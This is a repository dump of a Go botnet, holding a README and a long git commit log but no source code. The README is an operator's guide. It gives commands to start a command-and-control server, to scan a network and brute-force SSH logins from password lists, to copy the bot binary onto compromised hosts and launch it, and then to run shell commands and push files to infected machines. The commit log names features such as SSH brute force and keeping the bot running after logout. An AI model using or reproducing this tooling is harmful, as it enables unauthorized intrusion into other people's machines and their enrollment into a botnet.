@@ -1,0 +1,496 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+## Go Botnet
+
+Simple botnet written in GO. It features a command and control over cli and a botnet payload that communicates to the C&C over tcp.
+
+# Usage:
+
+Compile from the `botnet/cmd/botnet` directory.
+
+ - Run the C&C:
+
+```bash
+botnet listen
+```
+
+This starts up a C&C that listens on default port `9999`.
+
+- Attack a machine to get the botnet on the machine. The only supported attack right now is brute forcing SSH 
+
+```bash
+botnet -ufile /paht/to/usernames/file -pfile /path/to/passwords/file -bindir /path/to/botnet/bin/dir attack ssh
+```
+
+This will scan all the ips on the network find which ips have port 22 open and attempt to brute force its way in. Once it has access it will SCP the botnet binary over and execute the botnet client to connect to our command and control center
+
+ - Connect a payload to the C&C:
+
+```bash
+botnet -target 192.168.2.2 -port 9999 connect
+```
+
+This will start a botnet payload that connects to the C&C on port `9999`.
+
+- Now that we have a payload connected to our C&C we can run a view commands. You'll see the C&C prompt `<CC:#>`
+
+show all payloads connected to C&C:
+
+```bash
+<CC:#> show
+```
+
+This will return the payload ids and addresses
+
+```
+ID: 0 Address: 127.0.0.1:64635
+ID: 1 Address: 127.0.0.1:64634
+```
+
+- To communicate with the payload use the `use` command followed by the payloads id:
+
+```bash
+<CC:#> use 0
+```
+
+You will notice now your prompt is changed to `<PL:#>`
+
+- Execute a command in the remote server just type in a command:
+
+```bash
+<PL:#> ls -l
+```
+
+This will return the directory where the payload is running
+
+- Send a file to the payload:
+
+```bash
+<PL:#> u: /path/to/file
+```
+
+This will send the specified file to the payload
+
+- Exit out of the payload and go back to the main C&C
+
+```bash
+<PL:#> exit
+```
+
+You should see a message saying `payload exiting` and the prompt should be back to `<CC#>`
+
+#Terms of Use
+
+* Do NOT use this on any computer you do not own, or are not allowed to run this on.
+* You may NEVER attempt to sell this, its free and open source.
+* The authors and publishers assume no responsibility.
+* For educational purposes only.
+====================== GIT HISTORY: ======================
+7a6cc56 HEAD@{0}: clone: from https://github.com/threeaccents/botnet
+commit 7a6cc56809da3e5decb95e7a82ab942457ff3617
+Author: Rodrigo Lessa <rodzzlessa@gmail.com>
+Date:   Tue May 16 00:09:50 2017 -0400
+
+    update to tls connection
+
+commit a2c5730584394b288d6abe58e1f8f2da03d4446b
+Author: Rodrigo Lessa <rodzzlessa@gmail.com>
+Date:   Tue May 16 00:05:00 2017 -0400
+
+    update gitignore
+
+commit 0b300991cac746348a577f4579e898bb7f024ea5
+Author: Rodrigo Lessa <rodzzlessa@gmail.com>
+Date:   Tue May 16 00:00:45 2017 -0400
+
+    update paths
+
+commit f65a821e3a238ca435c126c47ae2965abc8320c3
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 12 14:34:19 2016 -0500
+
+    print out erros on ssh cmds
+
+commit b842edb82d01cb4f07f785369afba5da84a09901
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 12 14:33:10 2016 -0500
+
+    print out erros on ssh cmds
+
+commit 26a60cb4c62955853f2d3e320dbb4f19bf790e71
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 12 14:15:47 2016 -0500
+
+    update gitignore
+
+commit 5dd546332a247618d77a5789b6416107fc332dd9
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 12 14:13:42 2016 -0500
+
+    clean up install method
+
+commit f3757bdbd8ec32f81900d5f39a241638eaccf1b6
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 13:34:34 2016 -0500
+
+    update readme
+
+commit 96529a50b2f8b7f8910e8fc77c29d9ae7c0f7f41
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 13:33:48 2016 -0500
+
+    add terms of use to readme
+
+commit d0a4e5d2d42d6d07d1801216bb9a602aabc58726
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 13:07:34 2016 -0500
+
+    include sample username and password file
+
+commit 873ddf6ce6e7f12441d4f70c61c9748513a42b9f
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 13:04:59 2016 -0500
+
+    update latest binaries
+
+commit bb0ada8c56a2b372da9643fbcf418c0a2aafe49d
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 13:04:51 2016 -0500
+
+    update intel to amd64
+
+commit 35e9531a2942e1e5c44a1651d2a710abecfe16d6
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 13:00:17 2016 -0500
+
+    update file layout
+
+commit 0315701cba01ef3a76f70dc45a6d25aa7e53b275
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 12:58:15 2016 -0500
+
+    update osx to darwin
+
+commit 289886de17f1dac204aae70c36167f05cb407fac
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 08:51:22 2016 -0500
+
+    update readme
+
+commit c45055cc146a07b1648b7c8f9bf8f7debf12c9e4
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 08:50:46 2016 -0500
+
+    make base bin a flag
+
+commit 3c993b55dfc2745934899ac22c962d5b779edb59
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 08:38:17 2016 -0500
+
+    update binaries
+
+commit 8c8227e4e5ff514a192df6c0c3549c9426b3e463
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 08:36:39 2016 -0500
+
+    update client resp
+
+commit 6ea938aa94dc288076d5456d293cc27f9f9d51ac
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 08:34:49 2016 -0500
+
+    remove 'health checking'
+
+commit 6da07d506f61711be8e06fd55e2218f0d88a577b
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 08:34:20 2016 -0500
+
+    run botnet in the background with no hang up
+
+commit d6a4bb836221b03ede0a6d66232802472515a4df
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Thu Nov 10 08:09:14 2016 -0500
+
+    add diff linux architectures
+
+commit 4fffa40f188760e52fa593344efccaebdd5c957f
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Wed Nov 9 19:33:50 2016 -0500
+
+    avoid local ip adress
+
+commit 73ec2e7e2c76099f52ff7d88e452ddb66ad733ff
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Wed Nov 9 19:32:37 2016 -0500
+
+    update install method
+
+commit 633b3c45f9678e65c72f78bbe98f89664f7ddeeb
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 22:27:35 2016 -0500
+
+    update gitignore
+
+commit 3f06ffb1777c55291ff707196b19ae8b6239fb77
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 22:26:14 2016 -0500
+
+    update scp file
+
+commit d622c4db516e6039c28f0408e46253e9b6dec2d6
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 17:42:31 2016 -0500
+
+    Update read me
+
+commit bf19f051bf459b70fe34fb66be82c4e84815863f
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 11:15:21 2016 -0500
+
+    add mac osx binary
+
+commit c18985dda11e601542371ea3b5d50deb56837ce4
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 11:15:12 2016 -0500
+
+    include password in scp command
+
+commit 1817268c81d8d096f1e27ba270695dd49eddfbeb
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 11:15:02 2016 -0500
+
+    check os and send correct binary
+
+commit 49484074399fe957856b82df9e89ef584caae74a
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 10:55:47 2016 -0500
+
+    use dynamic local ip address
+
+commit 57468441174c01e511c608fc265e90a2a1fb89d2
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 09:31:09 2016 -0500
+
+    update readme
+
+commit 4534b608c9921e19ae27ef6da07db796b4a94b9a
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 09:25:12 2016 -0500
+
+    pass in new botnet commands
+
+commit d7d711fe5dbfefd115dc561421356897aeac5f34
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 09:24:00 2016 -0500
+
+    new botnet binary
+
+commit 92376e4b89b3a20a70ccfd70cbefaf5399f30b72
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 09:23:16 2016 -0500
+
+    update gitignore
+
+commit 318872b9b78e6235799cd662f0acc26f45a41436
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Nov 7 09:23:09 2016 -0500
+
+    update botnet commands
+
+commit eab9837c6c2cdd58dd9229a7fbff5f716dda8dd4
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 20:07:51 2016 -0500
+
+    update readme
+
+commit ef0eff4caf0a4f988b5d1e974070f2178ff0d051
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 20:06:21 2016 -0500
+
+    remove files
+
+commit f26823a4ecd1c0d8145a8303e8d1a326618f6d1b
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 20:04:45 2016 -0500
+
+    start instead of run ssh commands
+
+commit e49b93b85f11421cfd6bc6c5734d5b60c87220f4
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 20:04:01 2016 -0500
+
+    send & start botnet for ssh brute force
+
+commit 74df4c45e232df6c46aa3229c939b60b15a1f8ad
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 18:55:20 2016 -0500
+
+    clean up
+
+commit c646f8e6efbd084baaeeebb1b628af0798e6b37d
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 18:53:23 2016 -0500
+
+    add ssh brute force
+
+commit 4944ed002da07d409f5bade228eae2634eeaed0a
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 10:36:07 2016 -0500
+
+    initial ssh attack
+
+commit 3186ec4e454c1906815f67c24de12501b32f1a8c
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Nov 6 10:35:58 2016 -0500
+
+    update gitignore
+
+commit 1ec0fac116b5fb84a9b5f2af9087c0d03f2a4b96
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 5 18:06:54 2016 -0400
+
+    ssh brute force funtion
+
+commit eac3eeecc5a309bf029275ed8eecc39e6c781823
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 5 17:21:37 2016 -0400
+
+    add health checking
+
+commit 75b4c9fccc6e432d378c0a2fad8604f8a3c48b01
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 5 17:04:46 2016 -0400
+
+    update readme
+
+commit 3339ffb0f17315f339c3f7ceca364930c9f2ae6a
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 5 17:04:17 2016 -0400
+
+    update readme
+
+commit 1a1740fbe122283449df2eb43c29dbdc33ee8fda
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 5 17:03:00 2016 -0400
+
+    update git ignore and add cmd folder
+
+commit 989662f43adf36aed727a3cffcf30fb88a03e9e2
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Nov 5 17:01:59 2016 -0400
+
+    allow switching directories
+
+commit 1bcfa442f141461f605114d0b656ed61f66e7479
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Jun 6 12:45:50 2016 -0400
+
+    remove go routine
+
+commit 8c010a38808f68b2290ab607e03d0ac8aff819e7
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Jun 6 12:42:23 2016 -0400
+
+    pass in reconntime as a flag
+
+commit cee7c1ed4620cdd9c712d811cc8867925454e71d
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Jun 6 12:29:07 2016 -0400
+
+    handle reconnections
+
+commit 24a66839d228735ef589985e97b0eaff31c907fd
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Jun 6 12:19:08 2016 -0400
+
+    stop file download if failed
+
+commit e6eef7cfca89677aaaa68650c5de7ce8e59d2432
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Mon Jun 6 12:18:14 2016 -0400
+
+    stop file download if failed
+
+commit 88d93efc84d935737bddc89cd31162706463416b
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 21:28:40 2016 -0400
+
+    update comment
+
+commit 073c01d64efe4cd10899511a0fc35f68543801f8
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 21:24:11 2016 -0400
+
+    udate cc prompt
+
+commit dff417c78ee60f030d65fecb18aa316060c667ea
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 01:42:30 2016 -0400
+
+    update readme
+
+commit 9cb32278bc316ce2ce10545fb5de8b001bb7c60b
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 01:42:04 2016 -0400
+
+    update readme
+
+commit c5bd4c9acfec53a7b238e9a83b18410773025478
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 01:41:14 2016 -0400
+
+    update readme
+
+commit 27b65a85f1f2a893bc9e5609c4a5968e1ac4fed2
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 01:40:43 2016 -0400
+
+    update gitignore
+
+commit b8a394051b90e31f8a5976b26c2a07590145bee6
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 01:40:17 2016 -0400
+
+    update paths
+
+commit ac20fdd489981e1b952b3d41a619b405edb920c9
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 01:36:09 2016 -0400
+
+    grammar fix
+
+commit 51cdcae931f41c64a7d17dcbe1de09d952b4e3d6
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sun Jun 5 00:50:13 2016 -0400
+
+    remove print buffer
+
+commit af174d36b1c061043de1d234ec7ea89b3035d5ac
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Jun 4 16:51:16 2016 -0400
+
+    go-backdoor to backdoor
+
+commit 3f983231ebc58da5d21d65c91687a8565f6a8f55
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Jun 4 16:49:00 2016 -0400
+
+    update readme
+
+commit 66241093cc4b60fd0ac3da517e5215c8bd3be088
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Jun 4 16:38:15 2016 -0400
+
+    add gitignore and readme
+
+commit a0a21611b6dbd3bac75e9b2a877072d44a356c4c
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Jun 4 16:24:55 2016 -0400
+
+    send files to payload
+
+commit 4108b739b275179f422166582edcc786a892c792
+Author: rodzzlessa <rodzzlessa@gmail.com>
+Date:   Sat Jun 4 15:13:52 2016 -0400
+
+    run commands on selected payload
